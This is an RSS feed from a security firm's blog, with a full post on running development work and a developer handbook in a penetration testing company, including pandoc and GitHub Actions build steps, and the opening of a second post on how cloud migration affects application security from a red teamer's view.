<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JUMPSEC – Jumpsec</title>
    <link>//localhost:1313/categories/jumpsec/</link>
    <description>Recent content in Jumpsec on JUMPSEC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-GB</language>
    <lastBuildDate>Tue, 06 Aug 2024 00:00:00 +0000</lastBuildDate>
    
	  <atom:link href="//localhost:1313/categories/jumpsec/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>How to Handle Development Projects in a Pentest Company</title>
      <link>//localhost:1313/articles/2024/08/2024-08-06-how-to-handle-development-projects-in-a-pentest-company/</link>
      <pubDate>Tue, 06 Aug 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/08/2024-08-06-how-to-handle-development-projects-in-a-pentest-company/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/stallions.gif&#34; title=&#34;stallions&#34; alt=&#34;stallions&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;stallions&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;If you are a pentester you probably never really think about programming. Instead you are testing what others have developed. However, every now and then a quick python or bash script is needed to exploit some stuff you have found, or automate a certain process you are using. &lt;/p&gt;
&lt;p&gt;Things become interesting when you are in a penetration testing company that has many strong penetration testers and everyone writes these scripts. Clearly each script solves a particular problem, either for the tester or the team. So how do we ensure, that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;No time is wasted on writing the same scripts others have already written&lt;/li&gt;
&lt;li&gt;We keep the knowledge available when team members leave the business&lt;/li&gt;
&lt;li&gt;Ensure that any code is understandable for everyone&lt;/li&gt;
&lt;li&gt;Ensure that the knowledge in regards to the script is preserved for others to use.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The more scripts that are written, the more knowledge goes into code. Code needs maintenance. Suddenly we find ourselves in the same situation as any other software development company. With a difference though, the life expectancy for a script is often just for a single project that lasts up to one month. Meaning, the code goes into hibernation, people forget about it or someone might remember it eight months later on another project. What you might end up with is an unmaintained self hosted gitlab instance with 200 projects, that no one knows anything about. What makes it even more chaotic is the usage of different languages that testers are comfortable with. Some might have a stronger background in Ruby, some really like using Golang. Others might write Typescript instead of Javascript. Don’t forget about Rust, all the C languages and maybe even some good old PHP. &lt;/p&gt;
&lt;p&gt;I want to share my knowledge about these issues and how we tackle them at JUMPSEC. We are fortunate enough to have a dedicated development team given we work on larger projects, such as our proprietary solution that is the backbone to our Continuous Attack Surface Management service. &lt;/p&gt;
&lt;h1&gt;Understanding the basics&lt;/h1&gt;&lt;p&gt;Before we tackle anything, we must understand the root cause for any problem. You might want to skip this section and jump straight into the solution areas below as this is non technical and very dry. &lt;/p&gt;
&lt;p&gt;At the very top, we should understand how important development is and understand the differences and challenges a penetration testing company has. &lt;/p&gt;
&lt;p&gt;In general, a developer gets paid to work on a product that solves a problem for a customer. They do not get paid to write code, as plenty of juniors might think. A penetration tester is getting paid to write a report that outlines the security issues a client has. In the background a developer must write code to make their product usable, while a security expert chooses to make use of programming to help with a certain problem (but might never need to). &lt;/p&gt;
&lt;p&gt;If we look at this from a very high level, it should be clear that a developer has much more experience handling code, compared to a general security researcher, simply due to the time they spend on programming. There are of course exceptions, where you have a team member that moved from development to cyber security in their professional career. But remember, you are only as strong as the weakest link. &lt;/p&gt;
&lt;p&gt;Which brings us directly to the &lt;em&gt;people problem&lt;/em&gt;. It is already difficult to find new employees for a penetration testing company. The pool of experts is small and there is a worldwide shortage. Why would one make the pool even smaller, by requiring from a potential candidate that they know 10 different programming languages that might be used within the business? &lt;/p&gt;
&lt;p&gt;This brings us to some very important and specific requirements for our solution: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We must define what programming languages are used amongst the team&lt;/li&gt;
&lt;li&gt;Our solution cannot prohibit us from reducing the number of candidates &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Lets focus on the level of expertise and what we do with the weakest link and the most experienced developer on our pentest team. &lt;/p&gt;
&lt;p&gt;Generally, from my experience, penetration testers are not shy to play around with technology and are not afraid to break things. It is kinda part of the job description. So setting up a new environment for a project, like a C2 infrastructure is not really scarce. &lt;/p&gt;
&lt;p&gt;However, the approach between a developer, possibly with fullstack and devops experience, will differ from that of a security researcher. &lt;/p&gt;
&lt;p&gt;I believe in the year 2024 it is basic knowledge to set up stuff with docker and docker compose. However, I also think that it is not common to know your way around k8s, minicube and helm. Let alone I would never expect a pentester to be able to setup a full infrastructure as code project with Terraform, Ansible and Azure. Most certainly, not in an ad hoc situation for an adversarial simulation or similar pentest project. &lt;/p&gt;
&lt;p&gt;What if some members of the team are able to do that though? Well, the moment you start deploying projects in a very professional manner with lots of experience behind it, it becomes only manageable by the people that have that experience and exposure to the project. In other words, if your person leaves the business you start to have an unknown skeleton on your infrastructure, in some cases people might not even be able to login because of missing SSH keys. &lt;/p&gt;
&lt;p&gt;This brings us to the requirements:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Technology used must be easy to learn and should not require lots of specialised expertise&lt;/li&gt;
&lt;li&gt;Must have the resources to onboard new team members quickly&lt;/li&gt;
&lt;li&gt;The goal must be that everyone in the business is able to jump on the maintenance call and get stuff solved&lt;/li&gt;
&lt;li&gt;Do not become dependent on a single person in the business&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;The solution&lt;/h1&gt;&lt;p&gt;As we know from security and specifically ISO 27001 certifications, it&amp;rsquo;s all fine and great to have documents everywhere, but unless it really becomes the culture of the business, documents are useless. &lt;/p&gt;
&lt;p&gt;Unfortunately, we won’t be able to make it a culture without a document that clearly defines some processes and gives guidance to new members quickly. &lt;/p&gt;
&lt;p&gt;Quite frankly, a very well written document can speed up many different areas. &lt;/p&gt;
&lt;p&gt;Let’s call this document The Developer Handbook. &lt;/p&gt;
&lt;p&gt;If you have a look around the internet you will find many guides on how to write one. I would like to share with you our, real &amp;amp; currently in use, developer handbook. Furthermore, I will go into some details of some sections going forward. &lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s look into the sections that I believe are required for a successful document.&lt;/p&gt;
&lt;h2&gt;Format &amp;amp; Location&lt;span class=&#34;absolute -mt-20&#34; id=&#34;format--location&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#format--location&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Documentation for development projects quickly gets outdated, let&amp;rsquo;s start by hosting it on Github and writing it in markdown, so any IDE / text editor can handle it. &lt;/p&gt;
&lt;p&gt;Versioning is also taken care of by working with git. After all, everyone that does coding should be familiar with some version control system. &lt;/p&gt;
&lt;p&gt;We will use pandoc to convert the markdown to a PDF version, and in fact an HTML version as well. &lt;/p&gt;
&lt;h2&gt;Section 1 - Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-1---introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-1---introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This section should cover the purpose of the document. Making it clear why people should read it and what the overall expectations are (both for the document and the users).&lt;/p&gt;
&lt;h2&gt;Section 2- Code of Conduct&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-2--code-of-conduct&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-2--code-of-conduct&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As we are often building tools that make you think “what if this gets into the wrong hands”, we should remind ourselves why we do it. At the end of the day we are professional researchers that focus on security related subjects. The tools we write are there to make software behave in unintended ways, exploit vulnerabilities or make our life easier. &lt;/p&gt;
&lt;h2&gt;Section 3 - Defining Programming Languages&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-3---defining-programming-languages&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-3---defining-programming-languages&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In this section we should emphasise on our ability and set some limits. Sure it&amp;rsquo;s fun to explore new programming languages as a technical person. Frink, Rebol and Forth languages might look interesting during a weekend, but how many other people in the team could help out with those code bases? How quickly can issues be resolved by falling back to Stackoverflow and Google? Just because AI can help you with it, doesn’t mean it makes sense to use it in a business context. Keep those things to personal projects and find a common language everyone feels comfortable with. Usually that is: bash scripting, Python, sometimes Golang and lately more and more people are getting into Rust. &lt;/p&gt;
&lt;h2&gt;Section 4 - Code Styles&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-4---code-styles&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-4---code-styles&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This one is probably the most overlooked subject of all. However, it is incredibly useful &amp;amp; helpful to define a coding style for the entire team. It helps a lot, when everyone follows the same code style and no one needs to “adjust their way of reading”. &lt;/p&gt;
&lt;h2&gt;Section 5 - Editors&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-5---editors&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-5---editors&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Isn’t everyone on Sublime these days? Ah no, Atom looked so much nicer. What about Netbeans, PHPStorm, Eclipse (eh), vim, nano.  Well, and then there is VSCode. &lt;/p&gt;
&lt;p&gt;At the end of the day it doesn’t really matter which editor you use to write code in. What is more important is the set of features it can provide you to save time by automating tasks, such as formatting code to your set coding style. &lt;/p&gt;
&lt;p&gt;We went with VSCode. It is available in various “editions”, what matters for us is the extension ecosystem. We make heavy use of mypy, formatting and automated docstrings. solved within the editor and not just via pre-commit.&lt;/p&gt;
&lt;p&gt;If you are using VSCode, this would also be a good place to have specific configurations shared, including default configurations for developer containers.&lt;/p&gt;
&lt;h2&gt;Section 6 - Version Control&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-6---version-control&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-6---version-control&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;First of all you want to specify what version control system you want to use. Whether it is git or svn. However, it is more important that this section can help as a “tutorial” on some processes. Sure you would expect everyone to know “git clone”, “git pull”, “git add” and “git commit”. But how about merging? Is this something you expect every consultant to know? What about the language of git? Staging &amp;amp; Stashing are probably the easiest ones. However, never assume that everyone is on the same page as you are. Specifically with development, things can go wrong or be done in many different ways. How do we delete files from the git history again so we don’t expose some secrets? Should we squash and if so when? How to do things and when to do them, without going over the entire git manual is probably a good starting point for this section.&lt;/p&gt;
&lt;h2&gt;Section 7 - Project Setup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-7---project-setup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-7---project-setup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The project setup section should cover a few things such as how a project should be structured both in terms of files, how dependencies are managed, what type of files are required. Best practices for public Github repositories, and generally how a project should be managed. &lt;/p&gt;
&lt;p&gt;Given that we are in a git environment, why not create an example project folder as well? &lt;/p&gt;
&lt;h2&gt;Section 8 - Testing&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-8---testing&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-8---testing&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are many types of tests that can be written for any software project. Most likely performance tests are not the most important ones for pentesting software. However, this section should give some guidelines on what is expected and what testing suite should be used. &lt;/p&gt;
&lt;p&gt;It can also explain how to set up testing in a new project. How to use setUp and tearDown methods. &lt;/p&gt;
&lt;h2&gt;Section 9 - CI &amp;amp; CD&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-9---ci--cd&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-9---ci--cd&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Not every project needs a CI/CD process, however, whenever there is one it is imperative that certain actions are being executed. The section should talk about some limits in terms of resources to the company (not everyone has Github Enterprise with thousands of hours of worker times). Which workers should be used, what the authentication process looks like and how images need to be tagged.&lt;/p&gt;
&lt;h2&gt;Section 10 - Documentation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-10---documentation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-10---documentation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We are entering the inception phase with this one. Writing documentation and guidelines on how to document projects. However, it is a very important subject, as documentation often gets outdated very quickly. &lt;/p&gt;
&lt;p&gt;There are some solutions, such as self explaining code, building documentation automatically based on docstrings, comments etc. Rather than writing a handbook for each project, the time should be spent on the quality of the project. There might be a specific process that is involved to create documentation files automatically within the CI/CD as new versions are published. &lt;/p&gt;
&lt;h2&gt;Section 11 - Security&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-11---security&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-11---security&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Every programming language has some pitfalls. Specifically junior developers might fall for them. An obvious one might be the concatenation of strings rather than using f-strings. There are however many more and often some sort of approach or “library” should be established by developers within your company. Often code is reused, copy &amp;amp; pasted into new projects and simply adjusted. How do we check for security issues? What static code analysers should be used? Are there any requirements in the configuration of these? &lt;/p&gt;
&lt;h2&gt;Section 12 - Performance&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-12---performance&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-12---performance&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The performance section is quite an interesting one. Here, it is really up to you how deep you want to go  and how important performance considerations are. They certainly do matter, however, given that as a pentesting company your tools/products don’t serve 100 million end users it makes sense to show some approaches that might be better than introducing more advanced concepts such as multithreaded, multi core, async operations. Of course there are exceptions for certain tools. I suggest not to limit the section to pure technology based performance patterns, but also talk about general performance improvements within coding projects, such as best practices for code maintainability, documentation, dependencies, refactoring and so on.&lt;/p&gt;
&lt;h2&gt;Section 13 - Accessibility&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-13---accessibility&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-13---accessibility&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We kept this section very short. We do not support any accessibility. All tools must be in English, no translations needed. Nor special support for operation systems, screen readers etc. Our tools are not for “real end users”, they are for the tech community and our team. &lt;/p&gt;
&lt;p&gt;However, if you do publish something that goes out to clients or end users, it might make sense to think about this section in more depth. &lt;/p&gt;
&lt;h2&gt;Section 99 - Learning Resources&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-99---learning-resources&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-99---learning-resources&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This is probably the most important section for new team members, junior team members and anyone that is starting on a project. The handbook should provide some valuable links and collections to tutorials and courses that the team can use to understand certain subjects. There is no harm to also link to your own blog posts. &lt;/p&gt;
&lt;h1&gt;Give me a real example&lt;/h1&gt;&lt;p&gt;Now that you have an idea of what sections there should be in a handbook, have a look at ours:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/Developer.Handbook&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/Developer.Handbook&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Final Words&lt;/h1&gt;&lt;p&gt;A developer handbook is a constantly evolving document. The main purpose is to give guidance and contribute to the quality of development related work within a company. It should be adjusted every now and then, and it should never be considered a “finished product”. &lt;/p&gt;
&lt;p&gt;You will need to put the effort in yourself to create something that works for you and your team. This depends completely on the expertise of your team and what is important to your projects. There should be discussions with the team and every team member should be able to make changes to the document (remember section 99).&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h1&gt;Bonus Section&lt;/h1&gt;&lt;h2&gt;Github automation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;github-automation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#github-automation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To give you a bit of technology in this blog post I figured it is best to quickly go over Github actions so that you can automatically generate the latest PDF version of the markdown files which you can then share with your team or store them somewhere for your ISO audit. &lt;/p&gt;
&lt;p&gt;We are using [pandoc](&lt;a href=&#34;https://pandoc.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://pandoc.org/&lt;/a&gt;) to automatically merge the different sections to a PDF. However, we cannot directly make it a PDF, we first must make a final HTML version. &lt;/p&gt;
&lt;p&gt;You can go over each step by reviewing the file: &lt;a href=&#34;https://github.com/JumpsecLabs/Developer.Handbook/blob/main/.github/workflows/build-pdf.yml&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/Developer.Handbook/blob/main/.github/workflows/build-pdf.yml&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There are two jobs involved: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Building the final PDF version&lt;/li&gt;
&lt;li&gt;Releasing it under the release tab on Github&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Building a PDF&lt;span class=&#34;absolute -mt-20&#34; id=&#34;building-a-pdf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#building-a-pdf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We cannot directly go from markdown to PDF with pandoc. Hence we must create an HTML version first. &lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;pandoc -t html --include-before-body=./version.md -s -o developer_handbook.html --toc --number-sections --wrap=none $(cat pandoc_order.txt)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;This command takes all the files and in the same order as specified in the pandoc_order.txt file and converts them into a single standalone html file. &lt;/p&gt;
&lt;p&gt;Mind you, for the HTML version, we also have a css.md file, that allows us to make some nice colouring changes. &lt;/p&gt;
&lt;p&gt;Once we have the HTML version we run the converter to PDF&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;pandoc developer_handbook.html -s --pdf-engine=pdflatex -o developer_handbook.pdf -t pdf -f html&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Have a look at the step “Install pandoc” in case you have issues here.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    - name: Install pandoc
      run: |
        sudo apt-get install texlive-latex-base texlive-latex-extra texlive-fonts-recommended pandoc -y&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;We are running this workflow on a base Ubuntu image and therefore need to install the latex package required for the pdf-engine. There are other engines as well, but we had some issues that pandoc did not find. In addition to the base installation some extras are necessary and for good measure we also put the fonts package in there. &lt;/p&gt;
&lt;p&gt;There is an texlive-fonts-extra package for fonts, however that increases the running time for the installing step immensely. &lt;/p&gt;
&lt;p&gt;There is an alternative way of doing this, and it is also documented on the official pandoc website: &lt;a href=&#34;https://pandoc.org/installing.html#github-actions&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://pandoc.org/installing.html#github-actions&lt;/a&gt; &lt;/p&gt;
&lt;h3&gt;Releasing the PDF&lt;span class=&#34;absolute -mt-20&#34; id=&#34;releasing-the-pdf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#releasing-the-pdf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We keep the approach very simple. We have a version.md file which we can update at our own will and bump the version manually. &lt;/p&gt;
&lt;p&gt;If you look closely at the “Extract Version” step in the release job you can see we extract it and later use it to tag our release upload on Github.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;- name: Extract version
      id: extract_version
      run: |
        version=$(grep -oP &amp;#39;Version: \K[0-9]&amp;#43;\.[0-9]&amp;#43;\.[0-9]&amp;#43;&amp;#39; docs/version.md)
        echo &amp;#34;::set-output name=version::$version&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;h2&gt;Useful VSCode extensions&lt;span class=&#34;absolute -mt-20&#34; id=&#34;useful-vscode-extensions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#useful-vscode-extensions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are only two VSCode extensions I would recommend for this specific project type. &lt;/p&gt;
&lt;h3&gt;Markdown All in One &lt;span class=&#34;absolute -mt-20&#34; id=&#34;markdown-all-in-one&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#markdown-all-in-one&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This one should be a no-brainer to everyone. However, did you know it can generate a table of contents for you? Open the command palette and run the command “&lt;strong&gt;Create Table of Contents”.&lt;/strong&gt; &lt;/p&gt;
&lt;h3&gt;Markdown as PDF&lt;span class=&#34;absolute -mt-20&#34; id=&#34;markdown-as-pdf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#markdown-as-pdf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This one is a nice one if you want to create a quick PDF out of an MD file.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>How Cloud Migration is Affecting AppSec - A Red Teamer&#39;s Perspective</title>
      <link>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</link>
      <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</guid>
      <description>
        
        
        &lt;h2&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;I’ve recently spoken at several conferences about the changes that are underway within red teaming as a result of cloud migration. My team and I have been delivering majority cloud red team work over the last year and the differences are becoming more apparent by the day. One point I’ve mentioned as ‘controversial’ at several of these events is that cloud migration has actually made AppSec more important than ever. I went some way to trying to explain why I think this is during my talks, but it was something that I felt deserved its own blog post to explore in more detail, with clear examples of how compromise of an on-prem application can look different to a cloud-hosted one.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;disclaimer&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#disclaimer&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;AppSec is a huge domain and one that I will not try to pretend I am currently in a position to speak with authority on as I’ve been focused almost entirely on red teaming over the last few years. Whilst I was an application pentester many moons ago I will be discussing this topic from the perspective of a red teamer / threat actor looking to achieve notable impact from the compromise of an application, namely initial access into an organisation. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;The Traditional Approach&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-traditional-approach&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-traditional-approach&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, before jumping into the cloud-hosted application side of things, let’s briefly discuss the ‘traditional’ approach with which I will be comparing it to. Whilst there are countless ways of hosting a web application, let’s simplify it with a common setup looking something like the below image. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Reference: &lt;a href=&#34;https://www.wallarm.com/what/what-is-a-dmz&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.wallarm.com/what/what-is-a-dmz&lt;/a&gt;&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reference&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reference&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
